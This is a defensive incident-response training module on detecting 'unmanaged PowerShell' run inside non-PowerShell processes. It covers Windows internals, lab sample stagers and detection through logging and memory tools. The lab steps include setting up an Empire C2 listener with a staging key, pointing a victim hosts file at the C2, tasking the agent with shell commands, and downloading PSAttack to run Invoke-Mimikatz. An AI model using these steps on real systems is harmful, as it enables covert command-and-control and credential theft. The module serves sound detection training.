# Detecting Unmanaged PowerShell

Several offensive PowerShell tools use "unmanaged PowerShell" which is
when PowerShell functionality is executed without using a traditional
PowerShell process such as powershell.exe.

A common way to do this is to use .NET assemblies and libraries to
create a custom PowerShell runspace in which to execute PowerShell
scripts.

When successful, this is a very stealthy technique---PowerShell commands
can be run on a host without running any "powershell.exe" processes.

This training will review:

- [Windows Programs](#windows-programs)
- [Dynamic-Link Libraries](#dynamic-link-libraries)
- [Launching a Process](#launching-a-process)
- [PowerShell](#powershell)
- [.NET Assemblies](#.net-assemblies)
- [Attack Techniques](#attack-techniques)
- [Detections](#detections)

The following files will be used and are located on the OOB:

`/CSIRT/Sample-Files/umps.exe`

`/CSIRT/Sample-Files/umps.dll`


## Windows Programs

Programs are collections of instructions for the CPU that allow the
computer to perform a number of different tasks.

After programs are written in a high level language, a compiler
translates them to machine code producing object files.

A linker then "links" the object files with the external libraries they
depend on to produce executable files. 

Windows executables use the [Portable Executable
(PE)](https://raw.githubusercontent.com/corkami/pics/master/binary/PE101.png)
format containing headers and sections:

| | |
|-|-|
|Headers|DOS, PE, & Optional headers show the technical details|
|Sections|The executable code, imports, and data|
|\-\-\-.text|code|
|\-\-\-.data|variables|
|\-\-\-.rdata|constant variables|
|\-\-\-.pdata|exceptions|

Statically linked executables contain their dependencies and dynamically
linked executables do not.

![](images/Detecting%20Unmanaged%20Powershell/image001.png)


## Dynamic-Link Libraries

Microsoft DLLs contain functions that are available to any program that
loads the DLL and invokes that function.

User programs can't interact directly with the hardware so they talk to
DLLs which talk to the kernel.  Functions like ReadFile and CryptDecrypt
come with the OS.

Programs use API calls to interface with functions in different
libraries.  Each of these functions is used to access the OS and
hardware in a specific way (write a file, open a socket, etc).

Identifying libraries and functions that a program uses can reveal
interesting capabilities such as file and registry interactions, network
activity, and the use of encryption.

Here are some common DLLs with descriptions:

|Name|Description|
|-|-|
|NTDLL.DLL|Loaded into every process|
|KERNEL32.DLL|API functionality (LoadLibraryA, CreateProcess), Forwards directly to NTDLL|
|ADVAPI.DLL|Service control functions, Logon functions|
|KERNELBASE.DLL|Access to file systems, devices, processes, threads|
|GDI32.DLL|Video rendering, font management|
|SHELL32.DLL|Access to functions provided by OS shell|
|WinINet.DLL, WS2_32.DLL|Windows sockets, networking|
|USER32.DLL|GUIfunctions, Timers, IPC|


Looking at `tracert.exe` with CFF Explorer shows the 6 DLLs it imports:

![](images/Detecting%20Unmanaged%20Powershell/image002.png)


PEStudio also shows a description of each library:

![](images/Detecting%20Unmanaged%20Powershell/image003.png)


PEStudio's imports tab lists each of the 53 functions used and the DLL
that contains it:

![](images/Detecting%20Unmanaged%20Powershell/image004.png)


## Launching a Process

When a program runs, it runs in a container called a "process" that
allows threads to execute and access resources such as files, registry
keys, network sockets, etc.

In Windows x86, every process is allocated 4 GB of virtual memory which
is addressed from 0x00000000 to 0xFFFFFFFF.

A computer's actual physical memory may be more or less than
this---memory is managed by mapping each process's virtual addresses to
physical addresses.  

The OS separates this virtual memory into user space and kernel space:

|||
|-|-|
|0x00000000 - 0x7FFFFFFF|user|
|0x80000000 - 0xFFFFFFFF|kernel|

The process's address space is separated into blocks of memory called
segments which hold code and data and have access permissions.

### Segment Description Permissions

|Segment|Description|Permissions|
|-|-|-|
|.text|contains compiled, executable code|Read, Execute (RX)|
|.data|contains initialized global and static variables|Read, Write (RW)|
|.bss|contains uninitialized global and static variables|Read, Write (RW)|
|Heap|grows down toward higher memory addresses|Read, Write (RW)|
|Stack|grows up toward lower memory addresses|Read, Write (RW)|



When an executable is launched, the Windows loader parses its headers
and sections table and maps the file into the process's memory space.

Then the loader parses the imports and loads all required DLLs into
memory.  The addresses of all the APIs are resolved and written in the
Import Address Table (IAT).

The loader then calls the executable's first instruction called the
original entry point (OEP) to start the program.

The program begins to execute its code in memory and different functions
are called to perform different tasks.

![](images/Detecting%20Unmanaged%20Powershell/image005.png)


## PowerShell

When a PowerShell process is started, we can run the same command to see
the EXE that was loaded:

![](images/Detecting%20Unmanaged%20Powershell/image006.png)


But PowerShell is not just a program, it is a core component of Windows
which exists in the System.Management.Automation.dll.

If you search all processes that have this DLL loaded, you should only
see PowerShell processes:

![](images/Detecting%20Unmanaged%20Powershell/image007.png)


But just as `powershell.exe` and `powershell_ise.exe` use the
System.Management.Automation.dll to execute PowerShell code, so can
other programs.

Custom programs can be specifically designed to call .NET & Windows APIs
directly without using powershell.exe.

And when this happens, there will be a custom powershell instance that
will not show up as a powershell process when we list all system
processes.

Executing PowerShell code from within a C\#/.NET application is one way
to do this.

## .NET Assemblies

.NET is a cross language compatible software development platform
developed by Microsoft in 2002 which provides various functionality for
use in building applications.

MSBuild.exe can build .NET applications using an XML project file like
the following which contains a small C\# program that executes two
PowerShell commands:

![](images/Detecting%20Unmanaged%20Powershell/image008.png)


The first command writes two words to a file and the second command
sleeps for 20 seconds.

The result:

![](images/Detecting%20Unmanaged%20Powershell/image009.png)


While the PowerShell instance is executing its two commands, we can see
that the MSBuild.exe process is using PowerShell via the automation DLL:

![](images/Detecting%20Unmanaged%20Powershell/image010.png)


Security logs only show the MSBuild.exe process, no additional
PowerShell processes:

![](images/Detecting%20Unmanaged%20Powershell/image011.png)


So to a responder, it doesn't look like PowerShell is being used.  And
this would run even if powershell.exe and powershell_ise.exe were
blocked.

And this is what makes "unmanaged PowerShell" attractive to an attacker.

## Attack Techniques

There are [several different
techniques](https://bneg.io/2017/07/26/empire-without-powershell-exe/)
that can be used to run powershell without using powershell.exe, here
are just a few examples:

| | |
|-|-|
|[A Simple EXE](#a-simple-exe)|A .NET assembly that executes PowerShell runs in a non-powershell.exe (unmanaged) process|
|[A Simple DLL](#a-simple-dll)|A .NET assembly that executes PowerShell runs as a DLL inside a non-powershell.exe (unmanaged) process|
|[Encrypted Toolset EXE](#encrypted-toolkit-exe)|nto memory and executes them via  .NET assembly inside a non-powershell.exe (unmanaged) process|

### A Simple EXE

An example of the first technique is the file umps.exe which uses a .NET assembly to run an Empire stager script. 

To demonstrate:

- Double click on DNSQuerySniffer to start listening

- Double click the `umps.exe` file to run it

You should see a DNS query for the host internalproxy2 which fails and
causes the process to exit.

![](images/Detecting%20Unmanaged%20Powershell/image012.png)


Now start FakeNet-NG by typing `fakenet-script.py`

With FakeNet-NG running, double click the `umps.exe` file to run it

This time, FakeNet-NG answers the DNS request and shows the DLL makes
a GET request on port 7000:

![](images/Detecting%20Unmanaged%20Powershell/image013.png)


It answers with a default file and the program exits.

We can stand up our own C2 server for this file by decoding the Base64
command inside the umps.exe file and obtaining the staging key:

![](images/Detecting%20Unmanaged%20Powershell/image014.png)


To set up Empire listener on REMnux, do the following:

```powershell
cd /opt
sudo git clone https://github.com/EmpireProject/Empire.git
cd Empire/setup
sudo ./install.sh
```

(Hit enter when prompted)

```powershell
cd ..
./empire
listeners
uselistener http
set StagingKey X2!Wq=nZoYwK5svj.]6:>LS19CgAzO#&
set Name umps
set Host http://internalproxy2:7000
set Port 7000
Execute
```

Configure the victim system's host file so it calls out to your REMnux
machine by typing:

```powershell
Add-Content C:\Windows\System32\drivers\etc\hosts "192.168.2.100 internalproxy2"
```

Verify it has been added with:

```powershell
Get-Content C:\Windows\System32\drivers\etc\hosts
```

Run the umps.exe file and verify it connects with the C2 server.

To interact with the agent:

- Type `agents` to list all active agents
- Type `interact <agent name>` to interact with the agent
- Type `info` to see general information about the agent
- Type `shell <command>`  to task the agent with a shell command


### A Simple DLL

An example of the second technique is the file umps.dll which uses a
.NET assembly to run an Empire stager script.

To demonstrate:

- Run the DLL by typing `rundll32.exe umps.dll,EntryPoint`

Repeat same steps you used with the previous file and see what other
tools can be used to spot the `rundll32.exe` process and malicious DLL
running the PowerShell commands.

### Encrypted Toolkit EXE

An example of the third technique is a tool called PSAttack, a
self-contained custom PowerShell console which is built to natively
call .NET & Windows APIs.

It allows execution of several different offensive PowerShell tools
without using powershell.exe including PowerSploit, Nishang, Powercat,
Inveigh, and Invoke-TheHash.

The tools it contains are encrypted to evade AV.  When it runs in
memory, it decrypts the tools which are executed via unmanaged
PowerShell from within its own process.

To demonstrate, on the OOB:

- Open a PowerShell prompt and type `wget https://github.com/jaredhaight/PSAttack/releases/download/v1.9/PSAttack-1.9.zip -O PS.zip`

- Type `7z e PS.zip -y`

- Close the PowerShell window and double click on `PSAttack.exe`

- When the tool opens, type `Invoke-Mimikatz`

- Browse tools and logs for evidence of the credentials being stolen

Continue to monitor different tools as you execute some of the many
PowerShell attack tools included in PSAttack.

## Detection

### PowerShell  (MISS/DETECT)

Open a prompt and type `ps | ? modules -match 'System.Management.Automation'`

The umps.exe and rundll32.exe processes do not show the
System.Management.Automation DLL loaded:

![](images/Detecting%20Unmanaged%20Powershell/image015.png)


But the PSAttack executable does:

![](images/Detecting%20Unmanaged%20Powershell/image016.png)


### Process Creation Logging  (MISS)

Ensure process creation logging is enabled:

- To check current setting, type `auditpol /get /subcategory:"Process Creation"`

- To enable, type `auditpol /set /subcategory:"Process Creation" /success:enable`

As you execute commands with the Empire agent, Process Creation logs
are observed with the `umps.exe` as the parent process.

But no evidence of PowerShell execution is observed:

![](images/Detecting%20Unmanaged%20Powershell/image017.png)


### Script Block Logging:  (DETECT)

Ensure script block logging is enabled:

- To check current setting, type `Get-ItemProperty
    HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
    -Name EnableScriptBlockLogging`

- To enable, go to `gpedit` then go to Administrative Templates --> Windows
    Components --> Windows PowerShell --> Turn on PowerShell Script Block
    Logging

You can see the PowerShell scripts that are being run inside the
`umps.exe` process:

![](images/Detecting%20Unmanaged%20Powershell/image018.png)


### Transcription Logging:  (MISS/DETECT)

Ensure script block logging is enabled:

- To check current setting, type `Get-ItemProperty
    HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription
    -Name EnableTranscripting`

- To enable, type `gpedit` then go to Administrative Templates --> Windows
    Components --> Windows PowerShell --> Turn on PowerShell Transcription

No transcripts are created when running `umps.exe` or `umps.dll`, but they
are when `PSAttack.exe` runs.

Check the Documents folder for the transcript:

![](images/Detecting%20Unmanaged%20Powershell/image019.png)

### Process Hacker  (DETECT)

Shows PowerShell DLL is loaded into memory:

![](images/Detecting%20Unmanaged%20Powershell/image020.png)


### Rekal  (DETECT)

To start rekal, open a PowerShell prompt and type:

```powershell
Dev\Scripts\activate
rekal live
```

Using rekal, typing `ldrmodules pids=<pid>` and `dlllist pids=<pid>`
shows the PowerShell Automation DLL being used:

![](images/Detecting%20Unmanaged%20Powershell/image021.png)

